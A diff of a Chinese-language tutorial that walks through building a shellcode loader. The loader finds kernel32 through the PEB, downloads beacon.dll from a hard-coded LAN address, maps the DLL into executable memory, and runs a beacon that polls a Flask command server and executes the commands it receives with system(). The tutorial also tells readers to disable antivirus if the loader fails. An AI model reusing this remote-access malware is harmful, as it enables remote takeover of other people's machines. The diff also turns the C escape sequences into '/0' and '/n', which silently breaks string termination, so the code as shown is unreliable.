@@ -55,9 +55,9 @@
 
 ok，粗略捋清思路就开始吧！
 首先打开VS，选择控制台应用：
-![如图](image\1.png)
+![如图](image/1.png)
 由于我们写的是32位的shellcode，这里就选择x86，如下图：
-![如图](image\2.png)
+![如图](image/2.png)
 准备好后，正式开始！
 ps：作为参考，我会在全文最后放出完整代码
 
@@ -68,7 +68,7 @@ ps：作为参考，我会在全文最后放出完整代码
 ### 解决重定向第一步: 获取kernel32的地址
 
 复制粘贴这一坨东西，如下图：
-![如图](image\7.png)
+![如图](image/7.png)
 这坨代码干了3件事情：
 
 1. 找到 PEB（进程信息总表）
@@ -240,13 +240,13 @@ void shellcode_start() {
     if (kenrle32_base == 0) {
         __debugbreak();
     }
-    printf("kernel32: %p \n", kenrle32_base);
+    printf("kernel32: %p /n", kenrle32_base);
 }
 
 int main()
 {
     shellcode_start();
-    std::cout << "Hello World!\n";
+    std::cout << "Hello World!/n";
     system("pause");
 }
 
@@ -313,13 +313,13 @@ base_address = __readfsdword(0x30);
 找到系统“进程信息入口”（PEB） ——> 打开“已加载DLL列表” ——> 一个个翻 ——> 找到 kernel32.dll ——> 记住它的地址
 
 好，现在点击运行，看看情况怎么样
-![如图](image\3.png)
+![如图](image/3.png)
 弹出了这个，完美找到了kernel32的地址了！
-![如图](image\4.png)
+![如图](image/4.png)
 如果担心有问题，可以检查一下，查看模块列表,确认一下是否有误
-![如图](image\5.png)
+![如图](image/5.png)
 没问题！
-![如图](image\6.png)
+![如图](image/6.png)
 
 ### 解决重定向第二步: 解析导出表
 
@@ -362,8 +362,8 @@ typedef HMODULE(WINAPI* GetProcAddressT)(_In_ HMODULE hModule, _In_ LPCSTR lpPro
 
     unsigned long dwCounter = pExportDirectory->NumberOfNames;
 
-    char str1[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' };
-    char str2[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','\0' };
+    char str1[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '/0' };
+    char str2[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','/0' };
     while (dwCounter--)
     {
         char* cpExportedFunctionName = (char*)(kenrle32_base + DEREF_32(uiNameArray));
@@ -403,7 +403,7 @@ typedef HMODULE(WINAPI* GetProcAddressT)(_In_ HMODULE hModule, _In_ LPCSTR lpPro
     if (fnLoadlibrary == NULL || fnGetProcAddress == NULL) {
         __debugbreak();
     }
-    printf("kernel32: %p fnGetProcAddress :%p\n", fnLoadlibrary, fnGetProcAddress);
+    printf("kernel32: %p fnGetProcAddress :%p/n", fnLoadlibrary, fnGetProcAddress);
 ```
 
 看不懂这一坨代码他干了啥？那咱们继续一句一句解析！
@@ -450,18 +450,18 @@ char* name = ...
 
 ok,回到我们的实际操作。
 把上面的代码贴替换掉printf
-![如图](image\8.png)
+![如图](image/8.png)
 
 如果遇到如下报错，是以为没有声明，加个声明就能解决
 `#define DEREF_32( name )*(unsigned long *)(name)`
 `#define DEREF_16( name )*(unsigned short *)(name)`
-![如图](image\9.png)
+![如图](image/9.png)
 
 现在来运行一下看看
-![如图](image\10.png)
+![如图](image/10.png)
 
 没错吧！运行结构跟上面分析的一直：找到了函数指针fnGetProcAddress的地址
-![如图](image\11.png)
+![如图](image/11.png)
 
 ### 解决重定向第三步:进一步升级，动态解析+可复用
 
@@ -474,9 +474,9 @@ ok,回到我们的实际操作。
    if (fnLoadlibrary == NULL || fnGetProcAddress == NULL) {
         __debugbreak();
     }
-    char str3[] = { 'U','S','E','R','3','2','.','d','l','l','\0' };
-    char str4[] = { 'M','e','s','s','a','g','e','B','o','x','A','\0' };
-    char str5[] = { 'h','e','l','l','o',' ','w','o','r','l','d','\0' };
+    char str3[] = { 'U','S','E','R','3','2','.','d','l','l','/0' };
+    char str4[] = { 'M','e','s','s','a','g','e','B','o','x','A','/0' };
+    char str5[] = { 'h','e','l','l','o',' ','w','o','r','l','d','/0' };
     typedef int (WINAPI* MessageBoxAT)(_In_opt_ HWND hWnd,_In_opt_ LPCSTR lpText,_In_opt_ LPCSTR lpCaption,_In_ UINT uType);
     MessageBoxAT pMessageBoxA = (MessageBoxAT)fnGetProcAddress(fnLoadlibrary(str3), str4);
     if (pMessageBoxA == NULL) {
@@ -505,26 +505,26 @@ MessageBoxA(...)
 因为user32.dll" 会进 .rdata，而shellcode 访问不到
 
 ```
-char str3[] = { 'U','S','E','R','3','2','.','d','l','l','\0' };
+char str3[] = { 'U','S','E','R','3','2','.','d','l','l','/0' };
 ```
 
 ok，回到操作：
 复制粘贴上面那坨代码
-![如图](image\12.png)
+![如图](image/12.png)
 
 点击运行，发现报错了！可能是函数地址取错
-![如图](image\13.png)
+![如图](image/13.png)
 我们去看看getprocessaddress、loadlibrary是不是出了什么问题
 点击下方局部变量板块
-![如图](image\14.png)
+![如图](image/14.png)
 找到getprocessaddress、loadlibrary，分别鼠标右键转到反汇编，如下图：
 看fngetprocessaddress转到反汇编如下：
 75056780 mov edi,edi
 是正常的
-![如图](image\15.png)
+![如图](image/15.png)
 看fnloadlibrary转到反汇编如下：
 750DA39F inc edx
-![如图](image\16.png)
+![如图](image/16.png)
 是这里出现了问题！
 为啥？
 
@@ -605,9 +605,9 @@ fnLoadlibrary = (LoadLibraryAT)(kenrle32_base + DEREF_32(uiAddressArray));
 每次都重新从“函数表起点”开始算，这样就不会产生累加偏移指到乱七八糟的地方了。
 
 如图
-![如图](image\17.png)
+![如图](image/17.png)
 修复完毕，点击运行，成功解决
-![如图](image\18.png)
+![如图](image/18.png)
 
 ### 现在实现shellcode吧！
 
@@ -621,10 +621,10 @@ void shellcode_end() {
 }
 ```
 
-![如图](image\19.png)
+![如图](image/19.png)
 接着在main里面去掉之前的shellcode_start,生成模式从debug改成release
 
-![如图](image\67.png)
+![如图](image/67.png)
 
 然后复制下面这坨代码:
 
@@ -670,20 +670,20 @@ for (size_t i = 0; i < shellcode_size; i++)
 ```
 
 回到操作，把上面那坨代码复制粘贴进去后，
-![如图](image\20.png)
+![如图](image/20.png)
 由于VS会优化代码，增加security cookie
 而前者会,后者会让你的shellcode出现空指针异常(因为security cookie是全局变量,但是我们shellcode压根不能用)
 所以你必须关掉它:
 关闭security cookie:
 在菜单栏点击`项目`，点击`属性`会跳出属性页弹框
-![如图](image\21.png)
+![如图](image/21.png)
 点击`>c/c++`,找到`所有选项`,关闭安全检查
-![如图](image\22.png)
+![如图](image/22.png)
 关闭优化
-![如图](image\23.png)
+![如图](image/23.png)
 这是配置release的,记住！生成shellcode的时候***不能用debug生成***,否则你的函数地址会是错的！debug的gate函数而不是真正的函数!
 运行后，可以看到这么一大坨东西！你已经成功一大半了宝贝！
-![如图](image\24.png)
+![如图](image/24.png)
 现在复制粘贴下面这坨代码，然后再复制粘贴上面图片运行后弹出的这一大串数字（shellcode数组）到`char shellcode[] = { .... };`的括号{}里面，用于内存加载执行
 
 ```
@@ -733,11 +733,11 @@ run_shellcode();
 ```
 
 ok，回到操作，复制粘贴上面那坨东西，注意别把前面的逗号也复制粘贴了
-![如图](image\25.png)
+![如图](image/25.png)
 点击运行
-![如图](image\26.png)
+![如图](image/26.png)
 锵锵锵锵！shellcode的hell world大功告成！！
-![如图](image\27.png)
+![如图](image/27.png)
 
 ---
 
@@ -795,7 +795,7 @@ _调用 WinHttpCrackUrl_ 之前
 ```
 
 why?因为`= {0} `会让编译器自动生成memset，进而崩坏无法运行。
-![如图](image\28.png)
+![如图](image/28.png)
 
 #### 逐句分析环节
 
@@ -826,7 +826,7 @@ WinHttpCrackUrl()
 ↓
 把结果写进 URL_COMPONENTSW
 ↓
-URL_COMPONENTSW 指向 \_URL_INFO
+URL_COMPONENTSW 指向 /_URL_INFO
 
 ### 加载 WinHTTP
 
@@ -895,7 +895,7 @@ typedef HMODULE(WINAPI* WinHttpCrackUrlT)(_In_reads_(dwUrlLength) LPCWSTR pwszUr
     constexpr wchar_t strGet[] = L"GET";
 ```
 
-![如图](image\29.png)
+![如图](image/29.png)
 
 #### 逐句分析环节
 
@@ -1123,18 +1123,18 @@ WinHttpReadData(hRequest, pBuffer, dwContentSize, &dwReadBytes);
 ```
 
 现在运行一下，然后把正确的shellcode填进去（图片没截全，但是你懂得就行）
-![如图](image\30.png)
+![如图](image/30.png)
 现在就需要用到hfs了，我们双击hfs.exe，会弹出powershell弹窗还有一个网页，如图下
 我们点击网页的侧栏中的`share files`，
 点击加号`+`，
 随便放一个文件，
 然后改名为duck，
 点击`保存`
-![如图](image\31.png)
+![如图](image/31.png)
 现在我们点击运行，可以看到这些弹窗
-![如图](image\32.png)
+![如图](image/32.png)
 接着我们点击hfs网页，看日志log，没错，我们成功下载了duck
-![如图](image\33.png)
+![如图](image/33.png)
 完美，现在我们可以开启下一步了！！
 
 ## 三、beacon编写，手动把 DLL 加载到内存并执行
@@ -1143,9 +1143,9 @@ WinHttpReadData(hRequest, pBuffer, dwContentSize, &dwReadBytes);
 由于前面shellcode 是 x86的，因此此时写的 DLL 也必须是 x86，因此需要把beacon改成x86-release,并关闭安全选项
 MD改成MT
 如图
-![如图](image\beacon-1.png)
-![如图](image\beacon-2.png)
-![如图](image\beacon-3.png)
+![如图](image/beacon-1.png)
+![如图](image/beacon-2.png)
+![如图](image/beacon-3.png)
 
 因为MD是动态链接,体积是很小,而其他机子可能没有正常加载这些 DLL、没有初始化 CRT，同时可能目标机器没有这些库
 MT是全打包,不依赖外部 CRT，就能够支持
@@ -1177,7 +1177,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 }
 ```
 
-![如图](image\beacon-4.png)
+![如图](image/beacon-4.png)
 
 ### 加载beacon
 
@@ -1236,8 +1236,8 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     fnWinHttpReadData(hRequest, rawBuffer, fileSize, &dwReadBytes);
 ```
 
-![如图](image\34.png)
-![如图](image\35.png)
+![如图](image/34.png)
+![如图](image/35.png)
 
 #### 解析PE头
 
@@ -1251,8 +1251,8 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((LPBYTE)rawBuffer + pIDH->e_lfanew);
 ```
 
-![如图](image\36.png)
-![如图](image\37.png)
+![如图](image/36.png)
+![如图](image/37.png)
 
 #### 解析到PE头后,拿到真实大小
 
@@ -1261,7 +1261,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     fnMemcpy(imageBuffer, rawBuffer, pINH->OptionalHeader.SizeOfHeaders);
 ```
 
-![如图](image\38.png)
+![如图](image/38.png)
 
 #### 展开PE,拷贝raw内存的数据到更大的内存里面
 
@@ -1274,7 +1274,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     }
 ```
 
-![如图](image\39.png)
+![如图](image/39.png)
 
 #### 重定位
 
@@ -1303,7 +1303,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     }
 ```
 
-![如图](image\40.png)
+![如图](image/40.png)
 
 #### 修复导入表
 
@@ -1344,7 +1344,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     }
 ```
 
-![如图](image\41.png)
+![如图](image/41.png)
 
 #### 运行
 
@@ -1355,19 +1355,19 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     EntryPoint((HMODULE)imageBuffer, DLL_PROCESS_ATTACH, NULL); // Call the entry point
 ```
 
-![如图](image\42.png)
+![如图](image/42.png)
 接着把上面的地址改为http://192.168.1.5/beacon.dll
 
-![如图](image\43.png)
+![如图](image/43.png)
 现在我们就又要用到hfs了，双击hfs.exe，然后把beacon.dll上传
-![如图](image\44.png)
+![如图](image/44.png)
 开启调用
-![如图](image\45.png)
+![如图](image/45.png)
 点击运行
-![如图](image\46.png)
+![如图](image/46.png)
 当当当当！！！我们成功了！
-![如图](image\47.png)
-![如图](image\48.png)
+![如图](image/47.png)
+![如图](image/48.png)
 
 ## 四、服务器编写
 
@@ -1436,13 +1436,13 @@ app.run(debug=True, host="0.0.0.0")
 | debug=True   | 开发模式（报错更清晰） |
 | host=0.0.0.0 | 允许外部访问           |
 
-![如图](image\49.png)
+![如图](image/49.png)
 ok，回到操作
 我们打开控制台输入python 你的py文件名.py
-![如图](image\50.png)
+![如图](image/50.png)
 网页访问url
-![如图](image\52.png)
-![如图](image\51.png)
+![如图](image/52.png)
+![如图](image/51.png)
 当当当当！“你好世界”就映入眼帘了！
 
 现在我们先捋顺思路,了解一些概念：
@@ -1535,14 +1535,14 @@ def client_get_cmd():
     return "这是命令"
 ```
 
-![如图](image\53.png)
+![如图](image/53.png)
 啥意思？：客户端访问/api/v1/client/get_cmd的时候,执行方法
 client_get_cmd，返回一个”这是命令”
 
 把这个代码放到上面空白的地方后,访问http://xxxxxx/api/v1/client/get_cmd
 应该看得到这个接口的返回值了:
 
-![如图](image\54.png)
+![如图](image/54.png)
 然后我们需要定义一个全局变量（供后续操作）,`g_cmd = ""`就是一个全局变量，可以理解为： “当前要执行的命令”,`return g_cmd`把我们输出的内容替换成这个变量,客户端拿到的就是真实命令
 
 ```
@@ -1560,7 +1560,7 @@ if __name__ == "__main__":
     app.run(debug=True, host="0.0.0.0")
 ```
 
-![如图](image\55.png)
+![如图](image/55.png)
 为什么这里必须用“全局变量”？
 
 因为：我们的程序有多个接口（函数）,它们之间需要“共享数据”,所以必须有一个所有函数都能访问的地方
@@ -1597,7 +1597,7 @@ def server_get_respone():
     return "1337"
 ```
 
-![如图](image\56.png)
+![如图](image/56.png)
 
 ### 服务端输入命令&服务端获取回显
 
@@ -1634,11 +1634,11 @@ def server_get_client_respone():
 ### 测试
 
 打开控制台输入python 你的py文件名.py，启动，如下图
-![如图](image\57.png)
+![如图](image/57.png)
 接着浏览器访问
 http://xxxxx（你的IP地址）:5000/api/v1/server/send_cmd?key=1111&cmd=dir
 就可以看到：
-![如图](image\58.png)
+![如图](image/58.png)
 
 ```
 {
@@ -1649,7 +1649,7 @@ http://xxxxx（你的IP地址）:5000/api/v1/server/send_cmd?key=1111&cmd=dir
 
 然后继续访问http://xxxxxx:5000/api/v1/client/get_cmd
 就会返回你刚刚输入的命令和密钥
-![如图](image\59.png)
+![如图](image/59.png)
 
 ```
 1111|dir
@@ -1794,7 +1794,7 @@ auto Get(std::wstring url, void** outBuffer, size_t& outBufferSize) -> bool {
 
 复制粘贴完上面这一对代码后，会显示
 
-![如图](image\60.png)
+![如图](image/60.png)
 在头部加上这面这一坨声明和链接库就能解决
 
 ```
@@ -1806,7 +1806,7 @@ auto Get(std::wstring url, void** outBuffer, size_t& outBufferSize) -> bool {
 #pragma comment(lib, "winhttp.lib")
 ```
 
-![如图](image\61.png)
+![如图](image/61.png)
 
 #### 分析
 
@@ -1918,7 +1918,7 @@ http://xxxxx（你自己的IP地址）/api/v1/client/get_cmd
         static const std::wstring cmdUrl =
             L"http://192.168.1:5000/api/v1/client/get_cmd";
         Auth::Init();
-        printf("你的本地密钥是: %s 请不要随便分享给其他人\n",
+        printf("你的本地密钥是: %s 请不要随便分享给其他人/n",
             Auth::localKey.c_str());
         do {
             void* buffer = nullptr;
@@ -1932,7 +1932,7 @@ http://xxxxx（你自己的IP地址）/api/v1/client/get_cmd
                     std::string key = serverCmd.substr(0, 6);
                     if (Auth::CheckPassword(key)) {
                         std::string cmd = serverCmd.substr(7, serverCmd.size());
-                        printf("cmd: %s \n", cmd.c_str());
+                        printf("cmd: %s /n", cmd.c_str());
                         system(cmd.c_str());
                     }
                 }
@@ -1982,21 +1982,21 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,
 }
 ```
 
-![如图](image\63.png)
+![如图](image/63.png)
 beacon写好后保存生成方案
 
-![如图](image\64.png)
+![如图](image/64.png)
 打开hfs，在网页上传新的beacon.dll并保存
 
 这一切工作做好后，运行shellcode-2，（如果运行不了就关掉杀毒软件再运行）可以看到生成的密码
-![如图](image\62.png)
+![如图](image/62.png)
 http://192.168.1.5:5000/api/v1/server/send_cmd?key=7IXPFE&cmd=duck
-![如图](image\66.png)
+![如图](image/66.png)
 
 访问
 http://127.0.0.1:5000/api/v1/client/get_cmd
 应该会返回刚刚输入的命令和密钥
-![如图](image\65.png)
+![如图](image/65.png)
 坚持到这里的你做到了！！
 
 ---
@@ -2202,8 +2202,8 @@ void shellcode_start() {
 
     unsigned long dwCounter = pExportDirectory->NumberOfNames;
 
-    char str1[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' };
-    char str2[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','\0' };
+    char str1[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '/0' };
+    char str2[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','/0' };
     while (dwCounter--)
     {
         char* cpExportedFunctionName = (char*)(kernel32_base + DEREF_32(uiNameArray));
@@ -2475,9 +2475,9 @@ void shellcode_start() {
     PDLL_MAIN EntryPoint = (PDLL_MAIN)((LPBYTE)imageBuffer + pINH->OptionalHeader.AddressOfEntryPoint);
     EntryPoint((HMODULE)imageBuffer, DLL_PROCESS_ATTACH, NULL); // Call the entry point
 
-    char str3[] = { 'U','S','E','R','3','2','.','d','l','l','\0' };
-    char str4[] = { 'M','e','s','s','a','g','e','B','o','x','A','\0' };
-    char str5[] = { 'h','e','l','l','o',' ','w','o','r','l','d','\0' };
+    char str3[] = { 'U','S','E','R','3','2','.','d','l','l','/0' };
+    char str4[] = { 'M','e','s','s','a','g','e','B','o','x','A','/0' };
+    char str5[] = { 'h','e','l','l','o',' ','w','o','r','l','d','/0' };
     typedef int (WINAPI* MessageBoxAT)(_In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);
     MessageBoxAT pMessageBoxA = (MessageBoxAT)fnGetProcAddress(fnLoadlibrary(str3), str4);
     if (pMessageBoxA == NULL) {
@@ -2488,7 +2488,7 @@ void shellcode_start() {
         __debugbreak();
     }
 
-    //printf("kernel32: %p fnGetProcAddress :%p\n", fnLoadlibrary, fnGetProcAddress);
+    //printf("kernel32: %p fnGetProcAddress :%p/n", fnLoadlibrary, fnGetProcAddress);
 }
 void shellcode_end() {
     __debugbreak();
@@ -2502,8 +2502,8 @@ int main()
         auto sig_code = ((unsigned char*)start_address)[i];
         printf(",0x%02X", sig_code);
     }
-    std::cout << "Hello World!\n";
-    printf("start_address: %p \n", start_address);
+    std::cout << "Hello World!/n";
+    printf("start_address: %p /n", start_address);
     shellcode_start();
     char shellcode[] = {...};//...这里放shellcode
     PVOID p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -2665,7 +2665,7 @@ namespace Winhttp {
         static const std::wstring cmdUrl =
             L"http://192.168.1:5000/api/v1/client/get_cmd";
         Auth::Init();
-        printf("你的本地密钥是: %s 请不要随便分享给其他人\n",
+        printf("你的本地密钥是: %s 请不要随便分享给其他人/n",
             Auth::localKey.c_str());
         do {
             void* buffer = nullptr;
@@ -2679,7 +2679,7 @@ namespace Winhttp {
                     std::string key = serverCmd.substr(0, 6);
                     if (Auth::CheckPassword(key)) {
                         std::string cmd = serverCmd.substr(7, serverCmd.size());
-                        printf("cmd: %s \n", cmd.c_str());
+                        printf("cmd: %s /n", cmd.c_str());
                         system(cmd.c_str());
                     }
                 }
